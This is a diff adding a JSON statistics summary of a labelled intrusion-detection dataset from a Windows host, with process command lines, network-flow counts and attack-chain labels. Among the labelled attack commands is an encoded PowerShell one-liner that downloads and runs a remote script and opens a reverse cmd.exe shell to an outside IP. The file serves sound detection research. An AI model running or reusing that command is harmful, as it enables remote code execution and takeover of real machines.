@@ -1,0 +1,465 @@
+{
+ "process_cmd_top": [
+  [
+   null,
+   503581
+  ],
+  [
+   "C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s wlidsvc",
+   1194
+  ],
+  [
+   "C:\\WINDOWS\\system32\\wermgr.exe -upload",
+   877
+  ],
+  [
+   "C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s gpsvc",
+   821
+  ],
+  [
+   "\"C:\\WINDOWS\\system32\\SearchFilterHost.exe\" 0 744 748 756 8192 752 ",
+   777
+  ],
+  [
+   "\"C:\\WINDOWS\\system32\\backgroundTaskHost.exe\" -ServerName:App.AppXv783p9dqgsc3mek8m05c3tj95wa9p858.mca",
+   776
+  ],
+  [
+   "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" ",
+   724
+  ],
+  [
+   "\"C:\\WINDOWS\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",
+   409
+  ],
+  [
+   "\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1",
+   348
+  ],
+  [
+   "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+   252
+  ],
+  [
+   "taskhostw.exe",
+   148
+  ],
+  [
+   "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding",
+   127
+  ],
+  [
+   "\"C:\\Program Files\\Microsoft Office 15\\ClientX64\\OfficeC2RClient.exe\" /WatchService",
+   116
+  ],
+  [
+   "C:\\Windows\\System32\\smartscreen.exe -Embedding",
+   113
+  ],
+  [
+   "c:\\windows\\system32\\svchost.exe -k netsvcs",
+   107
+  ],
+  [
+   "C:\\WINDOWS\\System32\\svchost.exe -k netsvcs -p",
+   73
+  ],
+  [
+   "C:\\WINDOWS\\System32\\svchost.exe -k wsappx -p -s ClipSVC",
+   69
+  ],
+  [
+   "\"C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe\" ",
+   67
+  ],
+  [
+   "\"C:\\Program Files (x86)\\Mozilla Thunderbird\\thunderbird.exe\" ",
+   65
+  ],
+  [
+   "C:\\WINDOWS\\System32\\svchost.exe -k WerSvcGroup",
+   59
+  ],
+  [
+   "C:\\WINDOWS\\system32\\DllHost.exe /Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251}",
+   54
+  ],
+  [
+   "\"C:\\Program Files (x86)\\Microsoft Office\\Office15\\EXCEL.EXE\" ",
+   54
+  ],
+  [
+   "\"C:\\WINDOWS\\system32\\cmd.exe\" ",
+   54
+  ],
+  [
+   "\"C:\\WINDOWS\\system32\\notepad.exe\" ",
+   54
+  ],
+  [
+   "\"C:\\Program Files\\WindowsApps\\Microsoft.Windows.Photos_2018.18021.12420.0_x64__8wekyb3d8bbwe\\Microsoft.Photos.exe\" -ServerName:App.AppXzst44mncqdg84v7sv6p7yznqwssy6f7f.mca",
+   51
+  ]
+ ],
+ "process_cmd_forms": [
+  519493,
+  0,
+  511,
+  15213,
+  0
+ ],
+ "netflow_nodes": [
+  123279,
+  36148,
+  36112,
+  40
+ ],
+ "edges_process_to_netflow_by_op": [
+  [
+   "EVENT_SENDTO",
+   2814592
+  ],
+  [
+   "EVENT_BIND",
+   127147
+  ],
+  [
+   "EVENT_CONNECT",
+   87924
+  ]
+ ],
+ "edges_netflow_to_process_by_op": [
+  [
+   "EVENT_RECVFROM",
+   5355766
+  ],
+  [
+   "EVENT_ACCEPT",
+   263166
+  ]
+ ],
+ "netflow_nodes_with_events": 123279,
+ "netflow_nodes_with_multiple_processes": 9330,
+ "ts_range_utc": [
+  "2018-04-04 13:53",
+  "2018-04-13 21:08"
+ ],
+ "label_rows": 50,
+ "label_by_chain_label": [
+  [
+   "fivedirections_3.10_fail_hJauWl01",
+   "attack",
+   6
+  ],
+  [
+   "fivedirections_3.10_success_pass_mgr",
+   "attack",
+   8
+  ],
+  [
+   "fivedirections_3.10_success_pass_mgr",
+   "contaminated",
+   2
+  ],
+  [
+   "fivedirections_3.4_success",
+   "attack",
+   18
+  ],
+  [
+   "fivedirections_4.4_cmd",
+   "contaminated",
+   8
+  ],
+  [
+   "fivedirections_4.4_powershell",
+   "contaminated",
+   8
+  ]
+ ],
+ "labels_found_in_process_table": 32,
+ "flows_total": [
+  123279,
+  612,
+  608,
+  204,
+  36148
+ ],
+ "flows_by_day_utc": [
+  [
+   "2018-04-04",
+   2006,
+   0,
+   0,
+   20
+  ],
+  [
+   "2018-04-05",
+   12432,
+   0,
+   0,
+   28
+  ],
+  [
+   "2018-04-06",
+   3422,
+   0,
+   0,
+   16
+  ],
+  [
+   "2018-04-07",
+   4821,
+   0,
+   0,
+   18
+  ],
+  [
+   "2018-04-08",
+   4912,
+   0,
+   0,
+   21
+  ],
+  [
+   "2018-04-09",
+   25507,
+   4,
+   0,
+   85
+  ],
+  [
+   "2018-04-10",
+   3131,
+   0,
+   0,
+   23
+  ],
+  [
+   "2018-04-11",
+   16025,
+   604,
+   604,
+   58
+  ],
+  [
+   "2018-04-12",
+   44555,
+   4,
+   4,
+   30
+  ],
+  [
+   "2018-04-13",
+   6468,
+   0,
+   0,
+   23
+  ]
+ ],
+ "positive_flows_by_cmd": [
+  [
+   "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" ",
+   604,
+   604,
+   17,
+   0,
+   57902,
+   "fivedirections_3.4_success"
+  ],
+  [
+   "powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl",
+   4,
+   0,
+   2,
+   0,
+   80,
+   "fivedirections_4.4_powershell"
+  ],
+  [
+   "\"C:\\Program Files\\Mozilla Firefox\\add-on\\pass_mgr.exe\" \"C:\\Program Files\\Mozilla Firefox\\add-on\\pass_mgr.json\"",
+   4,
+   4,
+   1,
+   0,
+   80,
+   "fivedirections_3.10_success_pass_mgr"
+  ]
+ ],
+ "top_cmd_all": [
+  [
+   "c:\\windows\\system32\\svchost.exe -k networkservice -p -s Dnscache",
+   72214,
+   0
+  ],
+  [
+   "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" ",
+   45790,
+   604
+  ],
+  [
+   "\"C:\\Program Files\\TightVNC\\tvnserver.exe\" -service",
+   3526,
+   0
+  ],
+  [
+   "\"C:\\Program Files (x86)\\Mozilla Thunderbird\\thunderbird.exe\" ",
+   499,
+   0
+  ],
+  [
+   null,
+   152,
+   0
+  ],
+  [
+   "c:\\windows\\system32\\svchost.exe -k localserviceandnoimpersonation -p -s SSDPSRV",
+   126,
+   0
+  ],
+  [
+   "\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.12.17007.18022-0\\MpCmdRun.exe\" SignaturesUpdateService -ScheduleJob -HttpDownload -RestrictPrivileges -Reinvoke",
+   120,
+   0
+  ],
+  [
+   "\"c:\\salt\\bin\\python.exe\" c:\\salt\\bin\\Scripts\\salt-minion -c c:\\salt\\conf -l quiet",
+   105,
+   0
+  ],
+  [
+   "svchost.exe",
+   69,
+   0
+  ],
+  [
+   "c:\\windows\\system32\\svchost.exe -k networkservice -s TermService",
+   26,
+   0
+  ],
+  [
+   "c:\\windows\\system32\\svchost.exe -k localservice -p -s fdPHost",
+   25,
+   0
+  ],
+  [
+   "c:\\windows\\system32\\svchost.exe -k localserviceandnoimpersonation -p -s wcncsvc",
+   18,
+   0
+  ],
+  [
+   "C:\\Users\\admin\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe",
+   18,
+   0
+  ],
+  [
+   "c:\\windows\\system32\\svchost.exe -k localservicenetworkrestricted -p -s Dhcp",
+   16,
+   0
+  ],
+  [
+   "MpCmdRun.exe",
+   12,
+   0
+  ],
+  [
+   "\"c:\\salt\\bin\\python.exe\" \"-c\" \"from multiprocessing.forking import main; main()\" \"--multiprocessing-fork\" \"1800\"",
+   11,
+   0
+  ],
+  [
+   "nslookup  www.google.com",
+   9,
+   0
+  ],
+  [
+   "System",
+   8,
+   0
+  ],
+  [
+   "\"C:\\lwabeat\\\\lwabeat.exe\" -c \"C:\\lwabeat\\\\lwabeat.fivedir.yml\" -path.home \"C:\\lwabeat\" -path.data \"C:\\\\ProgramData\\\\lwa\"",
+   8,
+   0
+  ],
+  [
+   "\"C:\\Program Files\\OpenSSH-Win64\\sshd.exe\"",
+   8,
+   0
+  ]
+ ],
+ "dst_port_known_top": [
+  [
+   53,
+   18073,
+   0
+  ],
+  [
+   80,
+   17592,
+   131
+  ],
+  [
+   443,
+   10889,
+   173
+  ],
+  [
+   5355,
+   6417,
+   0
+  ],
+  [
+   143,
+   164,
+   0
+  ],
+  [
+   137,
+   51,
+   0
+  ],
+  [
+   25,
+   49,
+   0
+  ],
+  [
+   1900,
+   47,
+   0
+  ],
+  [
+   138,
+   44,
+   0
+  ],
+  [
+   55142,
+   21,
+   0
+  ],
+  [
+   49152,
+   12,
+   0
+  ],
+  [
+   55680,
+   10,
+   0
+  ]
+ ],
+ "windows_15min": [
+  854,
+  6
+ ],
+ "flows_per_window_quantiles": [
+  [
+   28.0,
+   167.50000000000023,
+   2051.440000000007
+  ],
+  3781
+ ]
+}
